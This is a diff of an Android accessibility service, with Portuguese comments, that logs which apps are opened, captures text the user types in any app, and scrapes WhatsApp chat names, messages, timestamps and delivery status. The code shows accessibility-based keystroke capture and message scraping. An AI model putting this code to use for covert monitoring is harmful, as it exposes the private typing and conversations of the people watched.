@@ -3,17 +3,18 @@ package vox.com.br.services;
 import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;
 
 import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
-import android.content.Intent;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
+import java.util.Locale;
 import java.util.Objects;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -27,9 +28,21 @@ import vox.com.br.model.Message;
 // Foi mal pelo código ruim, com tempo pode ter certeza que vou melhorar
 public class MyAccessibilityService extends AccessibilityService {
 
+    public boolean accessibilityServiceEnabled = false;
+    private static boolean isWhatsAppConversationOpen = false;
+    public static ChatWhats nomeDoChat = new ChatWhats("");
+    public static String timestampWhatsApp = "";
+
+    public MyAccessibilityService() {
+        super();
+    }
+
+    public boolean isAccessibilityServiceEnabled() {
+        return accessibilityServiceEnabled;
+    }
+
     // Testes para verificar se o scroll parou
     boolean scrollstate = false;
-
     private final Timer timer = new Timer();
     TimerTask timerTask = new TimerTask() {
         @Override
@@ -41,79 +54,99 @@ public class MyAccessibilityService extends AccessibilityService {
 
     // Quando acontecer um Evento de acessibilidade, esse código é executado
     @Override
-    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
+    public void onAccessibilityEvent(AccessibilityEvent event) {
 
-        Log.e(TAG, "onAccessibilityEvent Type:" + accessibilityEvent.getEventType());
+        Log.e(TAG, "onAccessibilityEvent Type:" + event.getEventType());
 
-        // Pegando uma Instância do AppAbertoDao para receber e popular os dados
         AppAbertoDao appAbertoDao = new AppAbertoDao();
 
         // Aqui pegamos o nome do pacote do evento estamos usando: (TYPE_WINDOW_STATE_CHANGED)
-        String nomeDoApp = accessibilityEvent.getPackageName().toString();
+        String nomeDoApp = event.getPackageName().toString();
 
-        // Resgatando o Horário com Calendar
         Calendar now = Calendar.getInstance();
-        String horarioDoOcorrido = now.get(Calendar.HOUR_OF_DAY) + ":" + now.get(Calendar.MINUTE) + ":" + now.get(Calendar.SECOND);
+        String horarioDoOcorrido = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss z", Locale.getDefault()).format(now.getTime());
+
 
         PackageManager packageManager = this.getPackageManager();
-        Intent intent = new Intent("android.intent.action.MAIN");
-        intent.addCategory("android.intent.category.HOME");
-
-
-        // Se o evento for do tipo TYPE_VIEW_CLICKED
-        if (AccessibilityEvent.TYPE_VIEW_CLICKED == accessibilityEvent.getEventType()) {
-            Log.e(TAG, "OnType_View_Clicked: ");
-        }
-
+//        Intent intent = new Intent("android.intent.action.MAIN");
+//        intent.addCategory("android.intent.category.HOME");
 
         // Se o evento for do tipo TYPE_VIEW_SCROLLED ----------------------------------------------
-        if (AccessibilityEvent.TYPE_VIEW_SCROLLED == accessibilityEvent.getEventType()) {
-            Log.e(TAG, "OnTYPE_VIEW_SCROLLED: ");
+//        if (AccessibilityEvent.TYPE_VIEW_SCROLLED == event.getEventType()) {
+//            Log.e(TAG, "OnTYPE_VIEW_SCROLLED: ");
+//
+//            try {
+//                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
+//                CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
+//
+//                if (applicationLabel.toString().equals("WhatsApp")) {
+//                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " + event.getPackageName());
+//
+//                    // Verifica se está no chat para tentar resgatar as mensagens
+//                    if (verificaSeEstaNoChat(packageManager, event)) {
+//                        // Logica para ver se parou de scrollar a tela
+//                        if (scrollstate) {
+//                            timerTask.cancel();
+//                            timerTask = new TimerTask() {
+//                                @Override
+//                                public void run() {
+//                                    Log.e(TAG, "executado! ");
+////                                    getChat(getRootInActiveWindow(), 0);
+//                                    scrollstate = false;
+//                                }
+//                            };
+//                            timer.schedule(timerTask, 1000);
+//                        } else {
+//                            timerTask = new TimerTask() {
+//                                @Override
+//                                public void run() {
+//                                    Log.e(TAG, "executado! ");
+////                                    getChat(getRootInActiveWindow(), 0);
+//                                    scrollstate = false;
+//                                }
+//                            };
+//                            timer.schedule(timerTask, 1000);
+//                        }
+//                        scrollstate = true;
+//                    }
+//
+//                }
+//            } catch (PackageManager.NameNotFoundException e) {
+//                throw new RuntimeException(e);
+//            }
+//
+//        }
 
-            try {
-                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
-                CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
+        // Se o evento for do tipo TYPE_VIEW_CLICKED -----------------------------------------------
+        if (AccessibilityEvent.TYPE_VIEW_CLICKED == event.getEventType()) {
+            Log.e(TAG, "OnTYPE_VIEW_CLICKED: " + event.getPackageName());
 
-                if (applicationLabel.toString().equals("WhatsApp")) {
-                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " + accessibilityEvent.getPackageName());
+            // Check if is going to enter in a chat
+            if (event.getPackageName().toString().equals("com.whatsapp") && event.getText().size() >= 4) {
+                timestampWhatsApp = event.getText().get(2).toString();
+                Log.i("ViewClicked", "entrou no chat" + timestampWhatsApp);
 
-                    // Verifica se está no chat para tentar resgatar as mensagens
-                    if (verificaSeEstaNoChat(getRootInActiveWindow(), 1)) {
-                        // Logica para ver se parou de scrollar a tela
-                        if (scrollstate) {
-                            timerTask.cancel();
-                            timerTask = new TimerTask() {
-                                @Override
-                                public void run() {
-                                    Log.e(TAG, "executado! ");
-                                    getChat(getRootInActiveWindow(), 0);
-                                    scrollstate = false;
-                                }
-                            };
-                            timer.schedule(timerTask, 1000);
-                        } else {
-                            timerTask = new TimerTask() {
-                                @Override
-                                public void run() {
-                                    Log.e(TAG, "executado! ");
-                                    getChat(getRootInActiveWindow(), 0);
-                                    scrollstate = false;
-                                }
-                            };
-                            timer.schedule(timerTask, 1000);
-                        }
-                        scrollstate = true;
-                    }
+                // https://stackoverflow.com/questions/4216745/java-string-to-date-conversion
+                // todo: Preciso de uma função que retorna a data com base nessa string.
 
-                }
-            } catch (PackageManager.NameNotFoundException e) {
-                throw new RuntimeException(e);
+
+            }
+
+        }
+
+        // Se o evento for do tipo TYPE_WINDOW_CONTENT_CHANGED -------------------------------------
+        if (AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED == event.getEventType()) {
+            Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " + event.getPackageName());
+
+            if (isWhatsAppConversationOpen) {
+//                getChat(getRootInActiveWindow(), 0);
+                Log.i(TAG, "WhatsApp está aberto, ativa a função.: ");
             }
 
         }
 
         // se o evento for do tipo TYPE_VIEW_TEXT_CHANGED ------------------------------------------
-        if (AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED == accessibilityEvent.getEventType()) {
+        if (AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED == event.getEventType()) {
             // Resgatando o nome do App
             ApplicationInfo applicationInfo;
             try {
@@ -125,22 +158,22 @@ public class MyAccessibilityService extends AccessibilityService {
 
             // Resgando oq está sendo digitado pelo usuário em um TextEdit
             List<String> textoDigitado = new ArrayList<>();
-            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                if (!accessibilityEvent.getText().isEmpty()) {
-                    Log.e(TAG, "onAccessibilityEvent: " + accessibilityEvent.getText().get(0).toString());
-                    textoDigitado.add(accessibilityEvent.getText().get(0).toString());
+            if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) { // ??????????????????????????????????????????? isso aqui é sempre true seu louco
+                if (!event.getText().isEmpty()) {
+                    Log.e(TAG, "onAccessibilityEvent: " + event.getText().get(0).toString());
+                    textoDigitado.add(event.getText().get(0).toString());
 
                     Log.e(TAG, "onAccessibilityEvent: " + textoDigitado);
                     AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);
                     appAbertoDao.atualizarDigitados(appAbertoAtual);
                 }
-
             }
         }
 
         // Se o evento for do tipo TYPE_WINDOW_STATE_CHANGED ---------------------------------------
-        if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == accessibilityEvent.getEventType()) {
+        if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event.getEventType()) {
             try {
+
                 // Resgatando o nome do App
                 ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
                 CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
@@ -149,14 +182,16 @@ public class MyAccessibilityService extends AccessibilityService {
                 List<String> textoDigitado = new ArrayList<>();
                 AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);
 
-                // Pega o chat do whats
-                if (applicationLabel.toString().equals("WhatsApp")) {
-                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " + accessibilityEvent.getPackageName());
-
-                    // Verifica se está no chat para tentar resgatar as mensagens
-                    if (verificaSeEstaNoChat(getRootInActiveWindow(), 1)) {
+                if (event.getClassName() != null) { // Check if the user is in the chat
+                    if (event.getClassName().toString().equals("com.whatsapp.Conversation")) {
+                        isWhatsAppConversationOpen = true;
+//                            logNodeHeirarchy(getRootInActiveWindow(),  0);
                         getChat(getRootInActiveWindow(), 0);
+                    } else {
+                        isWhatsAppConversationOpen = false;
                     }
+                } else {
+                    isWhatsAppConversationOpen = false;
                 }
 
                 // Verificando se existe algo no historico (se não existe quer dizer que o app está iniciando agora)
@@ -190,6 +225,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 throw new RuntimeException(e);
             }
         }
+
     }
 
     @Override
@@ -199,40 +235,9 @@ public class MyAccessibilityService extends AccessibilityService {
 
     @Override
     protected void onServiceConnected() {
-        super.onServiceConnected();
-
-        AccessibilityServiceInfo info = getServiceInfo();
-
-        info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
-        setServiceInfo(info);
-
-        info.eventTypes |=
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
-                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
-                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
-                        AccessibilityEvent.TYPE_VIEW_CLICKED
-        ;
-
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
-
-        info.notificationTimeout = 100;
-
-        this.setServiceInfo(info);
-
-        // Quando uma conexão com o serviço foi estabelecida (variável para manipular isso?)
+        accessibilityServiceEnabled = true;
         Log.e(TAG, "onServiceConnected: ");
-    }
-
-    public static Boolean verificaSeEstaNoChat(AccessibilityNodeInfo nodeInfo, int depth) {
-        if (nodeInfo == null) return false;
-
-        if (nodeInfo.getChild(0) == null) return false;
-        nodeInfo = nodeInfo.getChild(0);
-        if (nodeInfo.getClassName().toString().equals("android.widget.LinearLayout") && nodeInfo.getChildCount() == 2 && depth == 6)
-            return true;
-        depth++;
-
-        return verificaSeEstaNoChat(nodeInfo, depth);
+        super.onServiceConnected();
     }
 
     public static void logNodeHeirarchy(AccessibilityNodeInfo nodeInfo, int depth) {
@@ -241,12 +246,13 @@ public class MyAccessibilityService extends AccessibilityService {
 
         String logString = "";
         String className = nodeInfo.getClassName().toString();
+        String resourceName = nodeInfo.getViewIdResourceName();
 
         for (int i = 0; i < depth; ++i) {
             logString += " ";
         }
 
-        logString += "Text: " + nodeInfo.getText() + " " + " Content-Description: " + nodeInfo.getContentDescription() + " ClassName: " + nodeInfo.getClassName().toString() + " Depth: " + depth;
+        logString += "Text: " + nodeInfo.getText() + " " + " Content-Description: " + nodeInfo.getContentDescription() + " ClassName: " + nodeInfo.getClassName().toString() + " ResourceName: " + resourceName + " Depth: " + depth;
 
 
         if (depth == 11 && className.equals("android.view.ViewGroup")) {
@@ -272,9 +278,6 @@ public class MyAccessibilityService extends AccessibilityService {
         return contador;
     }
 
-    // Lista de mensagens
-    public static ChatWhats nomeDoChat = new ChatWhats("");
-
     public static void getChat(AccessibilityNodeInfo nodeInfo, int depth) {
         if (nodeInfo == null) return;
 
@@ -288,7 +291,7 @@ public class MyAccessibilityService extends AccessibilityService {
             // Criando o chat
             nomeDoChat.setNome(chat.getText().toString());
 
-            // Salvando o chat (nessa função verifica se já existe
+            // Salvando o chat (nessa função já faz a verifica se existe ou não)
             chatWhatsDao.salvar(nomeDoChat);
             Log.e(TAG, "getChat: " + chat);
         }
@@ -310,26 +313,77 @@ public class MyAccessibilityService extends AccessibilityService {
     }
 
     public static void getAnything(AccessibilityNodeInfo nodeInfo, Message message) {
-
         if (nodeInfo == null) return;
 
-        // Pega o texto e a descrição
         CharSequence text = nodeInfo.getText();
         CharSequence description = nodeInfo.getContentDescription();
+        CharSequence resourceName = nodeInfo.getViewIdResourceName();
 
-        // Se existir algum texto ou descrição, adiciona na lista
+        // If something exists, add to it
+        if (resourceName != null) {
+            message.addTudo(resourceName.toString());
+        }
+
         if (text != null) {
-            message.addMessage(text.toString());
+            message.addTudo(text.toString());
+
+            if (resourceName != null) {
+                if (resourceName.toString().equals("com.whatsapp:id/message_text")) {
+                    message.addMessage(text.toString());
+                }
+                if (resourceName.toString().equals("com.whatsapp:id/date")) {
+                    message.setHorario(text.toString());
+                }
+            }
+
         }
 
         if (description != null) {
-            message.addMessage(description.toString());
+            message.addTudo(description.toString());
+
+            if (resourceName != null) {
+                if (resourceName.toString().equals("com.whatsapp:id/status")) {
+                    message.setStatus(Message.MessageStatus.ENVIADO);
+                }
+            }
         }
 
         // Percorre os filhos
         for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
             getAnything(nodeInfo.getChild(i), message);
         }
+    }
+
+    public static String stringToDate(String date) {
+
+        Calendar c = Calendar.getInstance();
+
+        // Formatos que precisamos
+        DateFormat dateComplete = new SimpleDateFormat("EEE dd/MM/yyyy", Locale.getDefault());
+        DateFormat dateString = new SimpleDateFormat("EEE", Locale.getDefault());
+        DateFormat dateNumber = new SimpleDateFormat("dd/MM/yyyy", Locale.getDefault());
+
+        if (date.equalsIgnoreCase("Hoje")) {
+            return dateNumber.format(c.getTime());
+        } else if (date.equals("Ontem")) {
+            Calendar calendar = Calendar.getInstance();
+            calendar.add(Calendar.DATE, -1);
+            return dateNumber.format(calendar.getTime());
+        }
+
+        c.add(Calendar.DATE, -2);
+        for (int i = 0; i <= 7; i++) {
+
+            String diaDaSemana = dateString.format(c.getTime());
+            if (date.toLowerCase().contains(diaDaSemana)) {
+                return dateNumber.format(c.getTime());
+            }
+            c.add(Calendar.DATE, -1); // less one day
+
+        }
+
+        Log.e("stringToDate", "String in the parameter is not valid.");
+        return "";
     }
 
 }
